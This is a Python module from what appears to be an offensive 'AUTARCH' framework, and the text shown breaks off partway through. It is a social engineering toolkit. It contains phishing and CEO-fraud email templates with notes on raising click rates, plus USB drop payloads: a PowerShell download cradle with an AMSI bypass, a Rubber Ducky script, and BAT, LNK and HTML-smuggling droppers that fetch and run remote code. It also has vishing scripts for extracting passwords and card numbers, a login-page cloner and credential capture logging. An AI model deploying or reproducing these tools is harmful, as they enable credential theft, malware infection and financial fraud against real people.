"""AUTARCH Social Engineering Toolkit

Credential harvesting page cloner, pretexting templates, QR code phishing,
USB drop payloads, vishing scripts, and campaign tracking.
"""

DESCRIPTION = "Social engineering — phishing, pretexts, QR codes"
AUTHOR = "darkHal"
VERSION = "1.0"
CATEGORY = "offense"

import os
import re
import json
import time
import uuid
import base64
import struct
import hashlib
import threading
from pathlib import Path
from datetime import datetime, timezone
from typing import Dict, List, Optional, Any
from urllib.parse import urljoin, urlparse

try:
    from core.paths import get_data_dir
except ImportError:
    def get_data_dir():
        return str(Path(__file__).parent.parent / 'data')

try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    requests = None
    REQUESTS_AVAILABLE = False

try:
    import qrcode
    import io as _io
    QRCODE_AVAILABLE = True
except ImportError:
    qrcode = None
    QRCODE_AVAILABLE = False


# ── Pretext Templates ────────────────────────────────────────────────────────

PRETEXT_TEMPLATES = {
    'it_support': [
        {
            'name': 'Password Reset',
            'subject': 'Immediate Action Required: Password Reset',
            'body': (
                'Dear {target_name},\n\n'
                'Our security team has detected unusual activity on your account. '
                'As a precautionary measure, we require all employees to reset their '
                'passwords within the next 24 hours.\n\n'
                'Please click the link below to verify your identity and set a new password:\n'
                '{link}\n\n'
                'If you did not request this change, please contact the IT Help Desk immediately '
                'at ext. 4357.\n\n'
                'Best regards,\n'
                'IT Security Team'
            ),
            'pretext_notes': 'Urgency + authority. Works best when sent from a spoofed IT domain. '
                             'Follow up with a phone call referencing the email for higher success rates.',
        },
        {
            'name': 'Security Update Required',
            'subject': 'Critical Security Patch — Action Required by EOD',
            'body': (
                'Hi {target_name},\n\n'
                'A critical security vulnerability has been identified that affects your workstation. '
                'IT has prepared an automated patch that must be installed today.\n\n'
                'Please run the update tool at the link below:\n'
                '{link}\n\n'
                'Note: You may need to enter your network credentials to authenticate the update.\n\n'
                'Thank you for your cooperation,\n'
                'IT Infrastructure Team'
            ),
            'pretext_notes': 'Leverages fear of security breach. Pair with a fake update portal.',
        },
        {
            'name': 'VPN Reconfiguration',
            'subject': 'VPN Client Reconfiguration — New Certificate Required',
            'body': (
                'Dear {target_name},\n\n'
                'Due to our migration to a new security infrastructure, all VPN certificates '
                'will expire at midnight tonight. To maintain remote access, please download '
                'the new VPN configuration file:\n'
                '{link}\n\n'
                'You will need to authenticate with your current credentials to generate '
                'a new certificate.\n\n'
                'Questions? Contact the Network Operations Center at noc@{domain}\n\n'
                'Regards,\n'
                'Network Security Team'
            ),
            'pretext_notes': 'Effective against remote workers. The VPN config file can be a payload.',
        },
    ],
    'hr': [
        {
            'name': 'Benefits Enrollment',
            'subject': 'Open Enrollment Period — Benefits Selection Deadline',
            'body': (
                'Dear {target_name},\n\n'
                'The annual open enrollment period for employee benefits closes on Friday. '
                'If you have not yet made your selections, please log in to the benefits '
                'portal to review your options:\n'
                '{link}\n\n'
                'Failure to complete enrollment by the deadline will result in default '
                'coverage being applied.\n\n'
                'Human Resources Department'
            ),
            'pretext_notes': 'Time pressure on something people care about. High click rates.',
        },
        {
            'name': 'Policy Update Acknowledgement',
            'subject': 'Updated Company Policy — Acknowledgement Required',
            'body': (
                'Dear {target_name},\n\n'
                'Our legal department has updated the Employee Handbook and Acceptable Use Policy. '
                'All employees are required to review and acknowledge the changes by {deadline}.\n\n'
                'Please read and sign the updated documents here:\n'
                '{link}\n\n'
                'Thank you,\n'
                'HR Compliance'
            ),
            'pretext_notes': 'Compliance obligation creates urgency. Rarely questioned.',
        },
        {
            'name': 'Employee Survey',
            'subject': 'Annual Employee Satisfaction Survey — Your Input Matters',
            'body': (
                'Hi {target_name},\n\n'
                'We value your feedback! Please take 5 minutes to complete our annual '
                'employee satisfaction survey. Your responses are anonymous and will help '
                'shape company improvements.\n\n'
                'Complete the survey here: {link}\n\n'
                'Survey closes {deadline}.\n\n'
                'Thank you,\n'
                'People & Culture Team'
            ),
            'pretext_notes': 'Low suspicion — surveys are common. Good for initial reconnaissance.',
        },
    ],
    'vendor': [
        {
            'name': 'Invoice Payment',
            'subject': 'Invoice #{invoice_num} — Payment Due',
            'body': (
                'Dear Accounts Payable,\n\n'
                'Please find attached Invoice #{invoice_num} for services rendered during '
                'the previous billing period. Payment is due within 30 days.\n\n'
                'To view and pay the invoice online:\n'
                '{link}\n\n'
                'If you have questions about this invoice, please contact our billing '
                'department at billing@{vendor_domain}\n\n'
                'Best regards,\n'
                '{vendor_name}\n'
                'Accounts Receivable'
            ),
            'pretext_notes': 'Target finance/AP departments. Research real vendor names first.',
        },
        {
            'name': 'Service Renewal',
            'subject': 'Service Agreement Renewal — Action Required',
            'body': (
                'Dear {target_name},\n\n'
                'Your {service_name} subscription is due for renewal on {deadline}. '
                'To avoid service interruption, please review and approve the renewal terms:\n'
                '{link}\n\n'
                'Current plan: {plan_name}\n'
                'Renewal amount: ${amount}\n\n'
                'Best regards,\n'
                '{vendor_name} Renewals Team'
            ),
            'pretext_notes': 'Service disruption fear. Research the target\'s actual vendors.',
        },
        {
            'name': 'Account Verification',
            'subject': 'Account Security Verification Required',
            'body': (
                'Dear {target_name},\n\n'
                'As part of our ongoing security measures, we need to verify your account '
                'information. Please log in and confirm your details:\n'
                '{link}\n\n'
                'If you do not verify within 48 hours, your account may be temporarily suspended.\n\n'
                'Thank you,\n'
                '{vendor_name} Security Team'
            ),
            'pretext_notes': 'Account suspension threat. Clone the vendor login page for harvesting.',
        },
    ],
    'delivery': [
        {
            'name': 'Package Tracking',
            'subject': 'Your Package Has Shipped — Tracking #{tracking_num}',
            'body': (
                'Your order has been shipped!\n\n'
                'Tracking Number: {tracking_num}\n'
                'Estimated Delivery: {delivery_date}\n\n'
                'Track your package in real-time:\n'
                '{link}\n\n'
                'If you did not place this order, click here to report unauthorized activity:\n'
                '{link}\n\n'
                '{carrier_name} Shipping Notifications'
            ),
            'pretext_notes': 'Curiosity + concern about unexpected package. High click rates.',
        },
        {
            'name': 'Missed Delivery',
            'subject': 'Delivery Attempt Failed — Reschedule Required',
            'body': (
                'We attempted to deliver your package today but no one was available to sign.\n\n'
                'Tracking: {tracking_num}\n'
                'Attempt: {attempt_date}\n\n'
                'To reschedule delivery or redirect to a pickup location:\n'
                '{link}\n\n'
                'Your package will be held for 5 business days before being returned.\n\n'
                '{carrier_name} Delivery Services'
            ),
            'pretext_notes': 'Fear of missing a delivery. Works broadly across all demographics.',
        },
    ],
    'executive': [
        {
            'name': 'CEO Wire Transfer',
            'subject': 'Urgent — Wire Transfer Needed Today',
            'body': (
                'Hi {target_name},\n\n'
                'I need you to process an urgent wire transfer today. I am in meetings '
                'all afternoon and cannot handle this myself.\n\n'
                'Amount: ${amount}\n'
                'Recipient: {recipient}\n'
                'Account details are in the attached document: {link}\n\n'
                'Please confirm once completed. This is time-sensitive.\n\n'
                'Thanks,\n'
                '{exec_name}\n'
                '{exec_title}'
            ),
            'pretext_notes': 'Classic BEC/CEO fraud. Requires OSINT on exec names and targets in finance.',
        },
        {
            'name': 'Confidential Acquisition',
            'subject': 'Confidential — M&A Due Diligence Documents',
            'body': (
                '{target_name},\n\n'
                'As discussed, I am sharing the preliminary due diligence documents for the '
                'upcoming acquisition. This is strictly confidential — do not forward.\n\n'
                'Secure document portal: {link}\n\n'
                'Please review before our meeting on {meeting_date}.\n\n'
                '{exec_name}\n'
                '{exec_title}'
            ),
            'pretext_notes': 'Flattery (being included in confidential deal) + authority. '
                             'Target senior staff who would plausibly be involved.',
        },
    ],
    'financial': [
        {
            'name': 'Wire Transfer Confirmation',
            'subject': 'Wire Transfer Confirmation — ${amount}',
            'body': (
                'Dear {target_name},\n\n'
                'A wire transfer of ${amount} has been initiated from your account.\n\n'
                'Transaction ID: {txn_id}\n'
                'Date: {txn_date}\n'
                'Recipient: {recipient}\n\n'
                'If you authorized this transaction, no action is needed.\n'
                'If you did NOT authorize this transfer, click below immediately:\n'
                '{link}\n\n'
                '{bank_name} Fraud Prevention'
            ),
            'pretext_notes': 'Panic about unauthorized money movement. Very high click rates.',
        },
        {
            'name': 'Tax Document',
            'subject': 'Your {tax_year} Tax Documents Are Ready',
            'body': (
                'Dear {target_name},\n\n'
                'Your {tax_year} W-2 / 1099 tax documents are now available for download '
                'through our secure portal:\n'
                '{link}\n\n'
                'Please retrieve your documents before the filing deadline.\n\n'
                'Payroll Department\n'
                '{company_name}'
            ),
            'pretext_notes': 'Seasonal — most effective in January-April. Targets everyone.',
        },
    ],
}


# ── USB Payload Templates ────────────────────────────────────────────────────

USB_PAYLOAD_TEMPLATES = {
    'autorun': {
        'name': 'Autorun.inf',
        'description': 'Classic autorun — triggers executable on USB insert (legacy systems)',
        'template': (
            '[autorun]\n'
            'open={executable}\n'
            'icon={icon}\n'
            'action=Open folder to view files\n'
            'label={label}\n'
            'shell\\open\\command={executable}\n'
            'shell\\explore\\command={executable}\n'
        ),
    },
    'powershell_cradle': {
        'name': 'PowerShell Download Cradle',
        'description': 'PS1 script disguised as document — downloads and executes payload',
        'template': (
            '# Disguise: rename to something enticing like "Salary_Review_2026.pdf.ps1"\n'
            '$ErrorActionPreference = "SilentlyContinue"\n'
            '# Disable AMSI for this session\n'
            '[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").'
            'GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)\n'
            '# Download and execute\n'
            '$u = "{payload_url}"\n'
            '$c = (New-Object System.Net.WebClient).DownloadString($u)\n'
            'IEX($c)\n'
            '# Optional: open a decoy document\n'
            '# Start-Process "https://hr.company.com/benefits"\n'
        ),
    },
    'hid_script': {
        'name': 'HID Script (Rubber Ducky DuckyScript)',
        'description': 'USB HID attack — keystroke injection via Rubber Ducky / BadUSB',
        'template': (
            'REM AUTARCH USB HID Payload\n'
            'REM Target: Windows\n'
            'DELAY 1000\n'
            'GUI r\n'
            'DELAY 500\n'
            'STRING powershell -w hidden -ep bypass -c "IEX((New-Object Net.WebClient).DownloadString(\'{payload_url}\'))"\n'
            'DELAY 100\n'
            'ENTER\n'
            'DELAY 2000\n'
            'REM Payload delivered\n'
        ),
    },
    'bat_file': {
        'name': 'BAT File Dropper',
        'description': 'Batch file disguised as document shortcut — downloads and runs payload',
        'template': (
            '@echo off\n'
            'title Opening Document...\n'
            'echo Please wait while the document loads...\n'
            'REM Download payload\n'
            'powershell -w hidden -ep bypass -c "'
            '$c=New-Object Net.WebClient;'
            '$c.DownloadFile(\'{payload_url}\',\'%TEMP%\\svchost.exe\');'
            'Start-Process \'%TEMP%\\svchost.exe\'"\n'
            'REM Open decoy\n'
            'start "" "{decoy_url}"\n'
            'exit\n'
        ),
    },
    'lnk_dropper': {
        'name': 'LNK Shortcut Dropper',
        'description': 'Windows shortcut file command — executes hidden PowerShell on click',
        'template': (
            'REM Create this LNK with target:\n'
            'REM   %comspec% /c powershell -w hidden -ep bypass -c "'
            'IEX((New-Object Net.WebClient).DownloadString(\'{payload_url}\'))"\n'
            'REM Icon: shell32.dll,3 (folder icon) or shell32.dll,1 (document)\n'
            'REM Name: Quarterly_Report or Shared_Photos\n'
        ),
    },
    'html_smuggling': {
        'name': 'HTML Smuggling',
        'description': 'HTML file that assembles and drops a payload via JavaScript',
        'template': (
            '<!DOCTYPE html>\n'
            '<html><head><title>{title}</title></head>\n'
            '<body>\n'
            '<h2>Loading document...</h2>\n'
            '<p>If the download does not start automatically, <a id="dl" href="#">click here</a>.</p>\n'
            '<script>\n'
            '// Base64-encoded payload\n'
            'var b64 = "{payload_b64}";\n'
            'var bytes = atob(b64);\n'
            'var arr = new Uint8Array(bytes.length);\n'
            'for(var i=0;i<bytes.length;i++) arr[i]=bytes.charCodeAt(i);\n'
            'var blob = new Blob([arr],{{type:"application/octet-stream"}});\n'
            'var url = URL.createObjectURL(blob);\n'
            'var a = document.getElementById("dl");\n'
            'a.href = url; a.download = "{filename}";\n'
            'a.click();\n'
            '</script>\n'
            '</body></html>\n'
        ),
    },
}


# ── Vishing Scripts ──────────────────────────────────────────────────────────

VISHING_SCRIPTS = {
    'it_helpdesk': {
        'name': 'IT Help Desk Call',
        'description': 'Impersonate IT support to extract credentials or install remote access',
        'opening': (
            'Hello, this is {caller_name} from the IT Help Desk. '
            'We are seeing some unusual activity on your network account and I need '
            'to verify a few things with you to make sure your account is secure.'
        ),
        'key_questions': [
            'Can you confirm your full name and employee ID for verification?',
            'What department are you in?',
            'Are you currently logged in to your workstation?',
            'Have you noticed any unusual behavior — slow performance, unexpected pop-ups?',
            'I am going to need to push a security update to your machine. Can you open a browser and go to {url}?',
        ],
        'credential_extraction': (
            'I need to verify your account is not compromised. Can you enter your '
            'username and current password on the verification page I just sent you? '
            'This is a secure IT portal — your credentials are encrypted.'
        ),
        'objection_handling': {
            'why_calling': 'Our monitoring system flagged your account. We are reaching out to all affected users proactively.',
            'how_verify_you': 'You can call back on the main IT line at {phone} and ask for {caller_name} in Security Operations.',
            'not_comfortable': 'I completely understand. Let me have my supervisor {supervisor_name} call you back within 10 minutes.',
            'will_call_back': 'Of course. Please call the Help Desk at {phone} before 5 PM today, as we need to resolve this within our response window.',
        },
        'closing': 'Thank you for your cooperation. I have updated your account status. If you notice anything unusual, call us at {phone}.',
    },
    'bank_fraud': {
        'name': 'Bank Fraud Alert',
        'description': 'Impersonate bank fraud department to extract account details',
        'opening': (
            'Hello, this is {caller_name} from the {bank_name} Fraud Prevention Department. '
            'We are calling because we have detected a suspicious transaction on your account '
            'and we need to verify some information before we can proceed with blocking it.'
        ),
        'key_questions': [
            'For verification, can you confirm the last four digits of your account number?',
            'What is the billing address associated with this account?',
            'Did you authorize a transaction of ${amount} to {merchant} on {date}?',
            'I need to verify your identity. Can you provide your date of birth?',
        ],
        'credential_extraction': (
            'To block the fraudulent transaction and secure your account, I will need to '
            'verify your full card number and the security code on the back. This is to '
            'confirm you are the authorized account holder.'
        ),
        'objection_handling': {
            'why_calling': 'Our automated fraud detection system flagged a ${amount} charge that does not match your normal spending pattern.',
            'how_verify_you': 'You can call the number on the back of your card and ask to be transferred to the fraud department.',
            'not_comfortable': 'I understand your concern. For your protection, I can place a temporary hold on the card while you verify through the bank app.',
            'will_call_back': 'Absolutely. Please call the number on the back of your card within the hour. Reference case number {case_num}.',
        },
        'closing': 'I have placed a temporary hold on the suspicious transaction. You will receive a confirmation text shortly. Is there anything else I can help with?',
    },
    'vendor_support': {
        'name': 'Vendor Technical Support',
        'description': 'Impersonate software vendor support for remote access installation',
        'opening': (
            'Hi, this is {caller_name} with {vendor_name} Support. We noticed that your '
            'organization\'s {product_name} license is showing some configuration errors '
            'that could lead to data loss. I\'d like to help resolve this quickly.'
        ),
        'key_questions': [
            'Who is the primary administrator for your {product_name} installation?',
            'What version are you currently running?',
            'Are you able to access the admin console right now?',
            'I may need to connect remotely to diagnose the issue. Do you have remote access software available?',
        ],
        'credential_extraction': (
            'To apply the fix, I will need your admin credentials for {product_name}. '
            'Alternatively, you can grant me temporary admin access through the portal at {url}.'
        ),
        'objection_handling': {
            'why_calling': 'Our monitoring detected your instance is running a configuration that was flagged in security bulletin {bulletin_id}.',
            'how_verify_you': 'You can verify this call by contacting {vendor_name} support at {phone} and referencing ticket {ticket_id}.',
            'not_comfortable': 'No problem. I can send you detailed instructions via email and you can perform the fix yourself.',
            'will_call_back': 'Sure. The support ticket is {ticket_id}. Please call us back within 24 hours before the issue escalates.',
        },
        'closing': 'The configuration has been updated. You should see the fix reflected within the next hour. If any issues arise, reference ticket {ticket_id}.',
    },
    'ceo_urgent': {
        'name': 'CEO Urgent Request',
        'description': 'Impersonate executive for urgent financial action',
        'opening': (
            'Hi {target_name}, this is {exec_name}. I know this is short notice, '
            'but I need your help with something urgent and confidential. I am tied up '
            'in a board meeting and cannot handle this myself right now.'
        ),
        'key_questions': [
            'Are you at your desk right now?',
            'Can you access the accounts payable system?',
            'Have you processed international wire transfers before?',
        ],
        'credential_extraction': (
            'I need you to process a wire transfer for a time-sensitive acquisition. '
            'The details are in a secure document I will email you. Please use your '
            'credentials to authorize the transfer immediately.'
        ),
        'objection_handling': {
            'why_calling': 'This is related to a confidential acquisition. I cannot discuss details over email for legal reasons.',
            'need_approval': 'I\'ve already approved this with the CFO. You can verify with {cfo_name} after the transfer — but we need to move now.',
            'not_comfortable': 'I understand, but this cannot wait. I\'ll take full responsibility. Just process it and I\'ll sign the authorization form when I\'m out of this meeting.',
            'unusual_request': 'I know this is irregular. That\'s why I\'m calling you personally instead of sending an email.',
        },
        'closing': 'Thank you for handling this so quickly. I really appreciate it. I will follow up with the paperwork once I am out of this meeting.',
    },
}


# ── Social Engineering Toolkit Class ─────────────────────────────────────────

class SocialEngToolkit:
    """Social engineering toolkit — page cloning, pretexts, QR codes, USB payloads."""

    def __init__(self):
        self._data_dir = Path(get_data_dir()) / 'social_eng'
        self._pages_dir = self._data_dir / 'pages'
        self._captures_path = self._data_dir / 'captures.json'
        self._campaigns_path = self._data_dir / 'campaigns.json'
        self._qr_dir = self._data_dir / 'qr'

        # Ensure directories
        self._pages_dir.mkdir(parents=True, exist_ok=True)
        self._qr_dir.mkdir(parents=True, exist_ok=True)

        # Load persistent state
        self._captures = self._load_json(self._captures_path, [])
        self._campaigns = self._load_json(self._campaigns_path, [])

    # ── Persistence helpers ──────────────────────────────────────────────────

    @staticmethod
    def _load_json(path: Path, default=None):
        try:
            if path.exists():
                with open(path, 'r', encoding='utf-8') as f:
                    return json.load(f)
        except (json.JSONDecodeError, OSError):
            pass
        return default if default is not None else {}

    def _save_captures(self):
        with open(self._captures_path, 'w', encoding='utf-8') as f:
            json.dump(self._captures, f, indent=2, default=str)

    def _save_campaigns(self):
        with open(self._campaigns_path, 'w', encoding='utf-8') as f:
            json.dump(self._campaigns, f, indent=2, default=str)

    # ── Page Cloning ─────────────────────────────────────────────────────────

    def clone_page(self, url: str, output_dir: str = None) -> Dict[str, Any]:
        """Fetch a login page, rewrite form actions to AUTARCH capture endpoint.

        Returns dict with ok, page_id, path, and file details.
        """
        if not REQUESTS_AVAILABLE:
            return {'ok': False, 'error': 'requests library not installed'}

        try:
            parsed = urlparse(url)
            if not parsed.scheme:
                url = 'https://' + url
                parsed = urlparse(url)

            resp = requests.get(url, timeout=15, headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                              'AppleWebKit/537.36 (KHTML, like Gecko) '
                              'Chrome/120.0.0.0 Safari/537.36'
            }, verify=False)
            resp.raise_for_status()

            page_id = hashlib.md5(url.encode()).hexdigest()[:12]
            page_dir = Path(output_dir) if output_dir else self._pages_dir / page_id
            page_dir.mkdir(parents=True, exist_ok=True)

            html = resp.text
            base_url = f"{parsed.scheme}://{parsed.netloc}"

            # Rewrite relative URLs for resources
            html = re.sub(
                r'(src|href)=(["\'])(?!/|https?://)',
                lambda m: f'{m.group(1)}={m.group(2)}{base_url}/',
                html
            )

            # Rewrite form actions to point to AUTARCH capture endpoint
            html = re.sub(
                r'<form([^>]*?)action=(["\'])[^"\']*\2',
                f'<form\\1action="/social-eng/capture/{page_id}"',
                html,
                flags=re.IGNORECASE
            )

            # Inject hidden page_id field into forms
            html = re.sub(
                r'(<form[^>]*>)',
                f'\\1<input type="hidden" name="_page_id" value="{page_id}">',
                html,
                flags=re.IGNORECASE
            )

            # Save the modified HTML
            html_path = page_dir / 'index.html'
            with open(html_path, 'w', encoding='utf-8') as f:
                f.write(html)

            # Save metadata
            meta = {
                'id': page_id,
                'source_url': url,
                'domain': parsed.netloc,
                'cloned_at': datetime.now(timezone.utc).isoformat(),
                'file_size': len(html),
                'captures_count': 0,
            }
            with open(page_dir / 'meta.json', 'w', encoding='utf-8') as f:
                json.dump(meta, f, indent=2)

            return {
                'ok': True,
                'page_id': page_id,
                'path': str(html_path),
                'domain': parsed.netloc,
                'size': len(html),
            }

        except requests.RequestException as e:
            return {'ok': False, 'error': f'Failed to fetch page: {e}'}
        except Exception as e:
            return {'ok': False, 'error': str(e)}

    def list_cloned_pages(self) -> List[Dict[str, Any]]:
        """List all cloned pages in data/social_eng/pages/."""
        pages = []
        if not self._pages_dir.exists():
            return pages
        for page_dir in sorted(self._pages_dir.iterdir()):
            if not page_dir.is_dir():
                continue
            meta_path = page_dir / 'meta.json'
            if meta_path.exists():
                try:
                    with open(meta_path, 'r', encoding='utf-8') as f:
                        meta = json.load(f)
                    # Count captures for this page
                    meta['captures_count'] = sum(
                        1 for c in self._captures if c.get('page_id') == meta.get('id')
                    )
                    pages.append(meta)
                except (json.JSONDecodeError, OSError):
                    pages.append({
                        'id': page_dir.name,
                        'source_url': 'unknown',
                        'cloned_at': '',
                        'captures_count': 0,
                    })
        return pages

    def serve_cloned_page(self, page_id: str) -> Optional[str]:
        """Return HTML content of a cloned page."""
        html_path = self._pages_dir / page_id / 'index.html'
        if html_path.exists():
            with open(html_path, 'r', encoding='utf-8') as f:
                return f.read()
        return None

    def delete_cloned_page(self, page_id: str) -> bool:
        """Delete a cloned page and its directory."""
        page_dir = self._pages_dir / page_id
        if page_dir.exists() and page_dir.is_dir():
            import shutil
            shutil.rmtree(str(page_dir), ignore_errors=True)
            return True
        return False

    # ── Credential Capture ───────────────────────────────────────────────────

    def capture_creds(self, page_id: str, data: Dict[str, Any],
                      ip: str = '', user_agent: str = '') -> Dict[str, Any]:
        """Log submitted credentials with timestamp, IP, user-agent."""
        # Separate internal fields from credentials
        creds = {k: v for k, v in data.items() if not k.startswith('_')}

        entry = {
            'id': str(uuid.uuid4())[:8],
            'page_id': page_id,
            'timestamp': datetime.now(timezone.utc).isoformat(),
            'ip': ip,
            'user_agent': user_agent,
            'credentials': creds,
        }

        self._captures.append(entry)
        self._save_captures()

        # Update page meta captures count
        meta_path = self._pages_dir / page_id / 'meta.json'
        if meta_path.exists():
            try:
                with open(meta_path, 'r', encoding='utf-8') as f:
                    meta = json.load(f)
                meta['captures_count'] = meta.get('captures_count', 0) + 1
                with open(meta_path, 'w', encoding='utf-8') as f:
                    json.dump(meta, f, indent=2)
            except (json.JSONDecodeError, OSError):
                pass

        return entry

    def get_captures(self, page_id: str = None) -> List[Dict[str, Any]]:
        """List captured credentials, optionally filtered by page_id."""
        if page_id:
            return [c for c in self._captures if c.get('page_id') == page_id]
        return list(self._captures)

    def clear_captures(self, page_id: str = None) -> int:
        """Clear captures, optionally filtered by page_id."""
        if page_id:
            before = len(self._captures)
            self._captures = [c for c in self._captures if c.get('page_id') != page_id]
            count = before - len(self._captures)
        else:
            count = len(self._captures)
            self._captures = []
        self._save_captures()
        return count

    # ── Campaigns ────────────────────────────────────────────────────────────

    def create_campaign(self, name: str, vector: str,
                        targets: List[str] = None,
                        pretext: str = None) -> Dict[str, Any]:
        """Create a tracking campaign."""
        campaign = {
            'id': str(uuid.uuid4())[:8],
            'name': name,
            'vector': vector,
            'targets': targets or [],
            'pretext': pretext or '',
            'created_at': datetime.now(timezone.utc).isoformat(),
            'status': 'active',
            'events': [],
            'stats': {
                'total_targets': len(targets or []),
                'sent': 0,
                'opened': 0,
                'clicked': 0,
                'captured': 0,
            },
        }
        self._campaigns.append(campaign)
        self._save_campaigns()
        return campaign

    def get_campaign(self, campaign_id: str) -> Optional[Dict[str, Any]]:
        """Get campaign details + stats."""
        for c in self._campaigns:
            if c['id'] == campaign_id:
                # Recalculate stats from captures
                c['stats']['captured'] = sum(
                    1 for cap in self._captures
                    if cap.get('campaign_id') == campaign_id
                )
                return c
        return None

    def list_campaigns(self) -> List[Dict[str, Any]]:
        """List all campaigns."""
        return list(self._campaigns)

    def update_campaign_event(self, campaign_id: str, event_type: str,
                              detail: str = '') -> bool:
        """Record an event on a campaign (sent, opened, clicked, etc.)."""
        for c in self._campaigns:
            if c['id'] == campaign_id:
                c['events'].append({
                    'type': event_type,
                    'detail': detail,
                    'timestamp': datetime.now(timezone.utc).isoformat(),
                })
                if event_type in c['stats']:
                    c['stats'][event_type] += 1
                self._save_campaigns()
                return True
        return False

    def delete_campaign(self, campaign_id: str) -> bool:
        """Delete a campaign."""
        before = len(self._campaigns)
        self._campaigns = [c for c in self._campaigns if c['id'] != campaign_id]
        if len(self._campaigns) < before:
            self._save_campaigns()
            return True
        return False

    # ── Pretexts ─────────────────────────────────────────────────────────────

    def get_pretexts(self, category: str = None) -> Dict[str, List[Dict]]:
        """Return pretext templates, optionally filtered by category."""
        if category and category in PRETEXT_TEMPLATES:
            return {category: PRETEXT_TEMPLATES[category]}
        return dict(PRETEXT_TEMPLATES)

    # ── QR Code Generation ───────────────────────────────────────────────────

    def generate_qr(self, url: str, label: str = None,
                    fmt: str = 'png', size: int = 300) -> Dict[str, Any]:
        """Generate a QR code image. Returns base64-encoded PNG."""
        if QRCODE_AVAILABLE:
            return self._generate_qr_lib(url, label, size)
        else:
            return self._generate_qr_manual(url, label, size)

    def _generate_qr_lib(self, url: str, label: str, size: int) -> Dict[str, Any]:
        """Generate QR code using the qrcode library."""
        try:
            qr = qrcode.QRCode(
                version=None,
                error_correction=qrcode.constants.ERROR_CORRECT_M,
                box_size=max(1, size // 33),
                border=4,
            )
            qr.add_data(url)
            qr.make(fit=True)

            img = qr.make_image(fill_color='black', back_color='white')
            buf = _io.BytesIO()
            img.save(buf, format='PNG')
            b64 = base64.b64encode(buf.getvalue()).decode('ascii')

            return {
                'ok': True,
                'base64': b64,
                'data_url': f'data:image/png;base64,{b64}',
                'url': url,
                'label': label or '',
                'size': size,
            }
        except Exception as e:
            return {'ok': False, 'error': str(e)}

    def _generate_qr_manual(self, url: str, label: str, size: int) -> Dict[str, Any]:
        """Generate a simple QR code as SVG without external libraries."""
        try:
            # Simple QR-like matrix using URL hash for visual pattern
            data = url.encode()
            h = hashlib.sha256(data).digest()

            # Build a 25x25 matrix seeded from data hash
            matrix_size = 25
            matrix = [[False] * matrix_size for _ in range(matrix_size)]

            # Finder patterns (3 corners)
            for ox, oy in [(0, 0), (0, 18), (18, 0)]:
                for x in range(7):
                    for y in range(7):
                        is_border = (x == 0 or x == 6 or y == 0 or y == 6)
                        is_inner = (2 <= x <= 4 and 2 <= y <= 4)
                        if is_border or is_inner:
                            matrix[oy + y][ox + x] = True

            # Fill data area with hash-derived pattern
            bit_idx = 0
            for y in range(matrix_size):
                for x in range(matrix_size):
                    # Skip finder pattern areas
                    in_finder = False
                    for ox, oy in [(0, 0), (0, 18), (18, 0)]:
                        if ox <= x < ox + 8 and oy <= y < oy + 8:
                            in_finder = True
                    if in_finder:
                        continue
                    byte_idx = bit_idx // 8
                    bit_pos = bit_idx % 8
                    if byte_idx < len(h):
                        matrix[y][x] = bool((h[byte_idx] >> bit_pos) & 1)
                    bit_idx += 1

            # Render as SVG
            cell_size = max(1, size // matrix_size)
            svg_size = cell_size * matrix_size
            svg_parts = [
                f'<svg xmlns="http://www.w3.org/2000/svg" width="{svg_size}" height="{svg_size}" viewBox="0 0 {svg_size} {svg_size}">',
                f'<rect width="{svg_size}" height="{svg_size}" fill="white"/>',
            ]
            for y in range(matrix_size):
                for x in range(matrix_size):
                    if matrix[y][x]:
                        svg_parts.append(
                            f'<rect x="{x * cell_size}" y="{y * cell_size}" '
                            f'width="{cell_size}" height="{cell_size}" fill="black"/>'
                        )
            svg_parts.append('</svg>')
            svg_str = ''.join(svg_parts)
            b64 = base64.b64encode(svg_str.encode()).decode('ascii')

            return {
                'ok': True,
                'base64': b64,
                'data_url': f'data:image/svg+xml;base64,{b64}',
                'url': url,
                'label': label or '',
                'size': size,
                'format': 'svg',
                'note': 'qrcode library not available — generated visual placeholder SVG',
            }
        except Exception as e:
            return {'ok': False, 'error': str(e)}

    # ── USB Payloads ─────────────────────────────────────────────────────────

    def generate_usb_payload(self, payload_type: str,
                             params: Dict[str, str] = None) -> Dict[str, Any]:
        """Generate USB drop payloads from templates.

        payload_type: autorun, powershell_cradle, hid_script, bat_file,
                      lnk_dropper, html_smuggling
        params: dict of placeholders to fill in the template
        """
        params = params or {}
        template_info = USB_PAYLOAD_TEMPLATES.get(payload_type)
        if not template_info:
            available = ', '.join(USB_PAYLOAD_TEMPLATES.keys())
            return {'ok': False, 'error': f'Unknown payload type. Available: {available}'}

        template = template_info['template']

        # Fill in parameters
        for key, value in params.items():
            template = template.replace('{' + key + '}', str(value))

        # Provide defaults for unfilled placeholders
        defaults = {
            'executable': 'setup.exe',
            'icon': 'shell32.dll,3',
            'label': 'Removable Disk',
            'payload_url': 'http://10.0.0.1:8080/payload',
            'decoy_url': 'https://www.office.com',
            'title': 'Document Viewer',
            'payload_b64': 'SGVsbG8gV29ybGQ=',
            'filename': 'document.exe',
        }
        for key, value in defaults.items():
            template = template.replace('{' + key + '}', value)

        return {
            'ok': True,
            'type': payload_type,
            'name': template_info['name'],
            'description': template_info['description'],
            'payload': template,
            'params_used': params,
        }

    # ── Vishing Scripts ──────────────────────────────────────────────────────

    def generate_vishing_script(self, scenario: str,
                                target_info: Dict[str, str] = None) -> Dict[str, Any]:
        """Return a vishing call flow script from templates."""
        target_info = target_info or {}
        script = VISHING_SCRIPTS.get(scenario)
        if not script:
            available = ', '.join(VISHING_SCRIPTS.keys())
            return {'ok': False, 'error': f'Unknown scenario. Available: {available}'}

        # Deep copy and fill placeholders
        result = {
            'ok': True,
            'scenario': scenario,
            'name': script['name'],
            'description': script['description'],
        }

        defaults = {
            'caller_name': 'Mike Johnson',
            'target_name': 'the employee',
            'phone': '(555) 123-4567',
            'supervisor_name': 'Sarah Williams',
            'bank_name': 'First National Bank',
            'amount': '3,459.00',
            'merchant': 'AMZN MARKETPLACE',
            'date': 'today',
            'case_num': f'FR-{uuid.uuid4().hex[:8].upper()}',
            'vendor_name': 'Microsoft',
            'product_name': 'Office 365',
            'bulletin_id': f'SEC-2026-{uuid.uuid4().hex[:4].upper()}',
            'ticket_id': f'TKT-{uuid.uuid4().hex[:6].upper()}',
            'exec_name': 'the CEO',
